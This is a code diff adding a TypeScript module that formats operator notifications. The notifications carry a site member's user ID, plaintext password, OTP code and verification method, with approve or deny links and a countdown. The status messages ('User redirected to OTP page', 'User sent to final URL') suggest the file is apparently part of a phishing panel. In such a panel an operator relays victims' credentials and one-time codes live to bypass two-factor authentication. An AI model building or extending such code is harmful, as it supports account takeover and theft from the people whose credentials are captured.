@@ -1,0 +1,219 @@
+import { APPROVAL_TIMEOUT_MS } from '@/lib/approval-messages'
+
+/** Matches member-site approval poll timeout (90s). */
+export const ADMIN_PENDING_COUNTDOWN_SEC = APPROVAL_TIMEOUT_MS / 1000
+
+const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+
+/** Pick User ID / Username / Email label from the value the member entered. */
+export function loginIdentifierLabel(value: string): string {
+  const trimmed = value.trim()
+  if (!trimmed) return '👤 User ID:'
+  if (EMAIL_RE.test(trimmed)) return '👤 Email:'
+  if (/^\d+$/.test(trimmed)) return '👤 User ID:'
+  if (
+    /^[a-zA-Z0-9._-]+$/.test(trimmed) &&
+    /[a-zA-Z]/.test(trimmed) &&
+    (trimmed.includes('.') || trimmed.includes('_'))
+  ) {
+    return '👤 Username:'
+  }
+  return '👤 User ID:'
+}
+
+export function formatCountdownLabel(secondsLeft: number): string {
+  const safe = Math.max(0, Math.floor(secondsLeft))
+  const m = Math.floor(safe / 60)
+  const s = safe % 60
+  return `${m}:${s.toString().padStart(2, "0")}`
+}
+
+export function secondsLeftFromCreatedAt(
+  createdAtMs: number,
+  nowMs = Date.now(),
+  ttlSec = ADMIN_PENDING_COUNTDOWN_SEC,
+): number {
+  return Math.max(0, ttlSec - Math.floor((nowMs - createdAtMs) / 1000))
+}
+
+export function methodLabel(method?: string): string | null {
+  const value = String(method ?? "").trim()
+  if (!value || value === "—" || value === "-") return null
+  if (value === "email") return "Email"
+  if (value === "text" || value === "sms") return "Text Message (SMS)"
+  if (value === "call") return "Phone Call"
+  return value
+}
+
+type CodeFn = (value: unknown) => string
+type LinkFn = (url: string, label?: string) => string
+
+function optionalMethodLine(method: string | undefined, asCode: CodeFn): string {
+  const label = methodLabel(method)
+  if (!label) return ""
+  return `📧 Method: ${asCode(label)}\n`
+}
+
+function optionalCountdownLine(
+  secondsLeft: number | undefined,
+  asCode: CodeFn,
+): string {
+  if (secondsLeft === undefined) return ""
+  return `⏱ Time left: ${asCode(formatCountdownLabel(secondsLeft))}\n`
+}
+
+export function buildLoginApprovalRequestBody(data: {
+  userId: string
+  password?: string
+  method?: string
+  adminLink: string
+  secondsLeft?: number
+  asCode: CodeFn
+  asLink: LinkFn
+}): string {
+  const password = String(data.password ?? "").trim() || "—"
+  return [
+    "🔔 Login request – approve or deny",
+    "━━━━━━━━━━━━━━━━━━",
+    `${loginIdentifierLabel(data.userId)} ${data.asCode(data.userId)}`,
+    `🔑 Password: ${data.asCode(password)}`,
+    `📤 Send Code`,
+    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
+    "",
+    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
+  ]
+    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
+    .join("\n")
+    .replace(/\n{3,}/g, "\n\n")
+}
+
+export function buildOtpApprovalRequestBody(data: {
+  userId: string
+  code: string
+  method?: string
+  adminLink: string
+  secondsLeft?: number
+  asCode: CodeFn
+  asLink: LinkFn
+}): string {
+  return [
+    "🔔 OTP submitted – approve or deny",
+    "━━━━━━━━━━━━━━━━━━",
+    `${loginIdentifierLabel(data.userId)} ${data.asCode(data.userId)}`,
+    `🔐 Code: ${data.asCode(data.code)}`,
+    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
+    "",
+    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
+  ]
+    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
+    .join("\n")
+    .replace(/\n{3,}/g, "\n\n")
+}
+
+export function buildMethodApprovalRequestBody(data: {
+  userId: string
+  method: string
+  adminLink: string
+  secondsLeft?: number
+  asCode: CodeFn
+  asLink: LinkFn
+}): string {
+  return [
+    "🔔 Verification method selected – approve or deny",
+    "━━━━━━━━━━━━━━━━━━",
+    `${loginIdentifierLabel(data.userId)} ${data.asCode(data.userId)}`,
+    optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
+    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
+    "",
+    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
+  ]
+    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
+    .join("\n")
+    .replace(/\n{3,}/g, "\n\n")
+}
+
+export function buildAdminLoginApprovedBody(data: {
+  userId?: string
+  password?: string
+  method?: string
+  asCode: CodeFn
+  isOtp?: boolean
+}): string {
+  const password = String(data.password ?? "").trim()
+  const lines = [
+    data.isOtp ? "✅ CC – OTP Approved" : "✅ CC – Login Approved",
+    "━━━━━━━━━━━━━━━━━━",
+    `${loginIdentifierLabel(data.userId ?? "")} ${data.asCode(data.userId)}`,
+  ]
+
+  if (data.isOtp) {
+    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
+  } else {
+    lines.push(`Password: ${data.asCode(password || "—")}`)
+  }
+
+  const methodLine = optionalMethodLine(data.method, data.asCode)
+  if (methodLine) lines.push(methodLine.trimEnd())
+
+  lines.push(
+    data.isOtp
+      ? "✅ Status: Approved – User sent to final URL"
+      : "✅ Status: Approved – User redirected to OTP page",
+  )
+
+  return lines.join("\n")
+}
+
+export function buildAdminLoginDeniedBody(data: {
+  userId?: string
+  password?: string
+  method?: string
+  asCode: CodeFn
+  isOtp?: boolean
+}): string {
+  const password = String(data.password ?? "").trim()
+  const lines = [
+    data.isOtp ? "❌ CC – OTP Denied" : "❌ CC – Login Denied",
+    "━━━━━━━━━━━━━━━━━━",
+    `${loginIdentifierLabel(data.userId ?? "")} ${data.asCode(data.userId)}`,
+  ]
+
+  if (data.isOtp) {
+    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
+  } else {
+    lines.push(`Password: ${data.asCode(password || "—")}`)
+  }
+
+  const methodLine = optionalMethodLine(data.method, data.asCode)
+  if (methodLine) lines.push(methodLine.trimEnd())
+
+  lines.push("❌ Status: Denied – User shown error message")
+  return lines.join("\n")
+}
+
+export function buildAdminLoginRedirectedBody(data: {
+  userId?: string
+  password?: string
+  method?: string
+  asCode: CodeFn
+  isOtp?: boolean
+}): string {
+  const password = String(data.password ?? "").trim()
+  const lines = [
+    data.isOtp ? "↪️ CC – OTP Redirected" : "↪️ CC – Login Redirected",
+    "━━━━━━━━━━━━━━━━━━",
+    `${loginIdentifierLabel(data.userId ?? "")} ${data.asCode(data.userId)}`,
+  ]
+
+  if (data.isOtp) {
+    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
+  } else {
+    lines.push(`Password: ${data.asCode(password || "—")}`)
+  }
+
+  const methodLine = optionalMethodLine(data.method, data.asCode)
+  if (methodLine) lines.push(methodLine.trimEnd())
+
+  lines.push("↪️ Status: Redirected – User sent to final URL")
+  return lines.join("\n")
+}
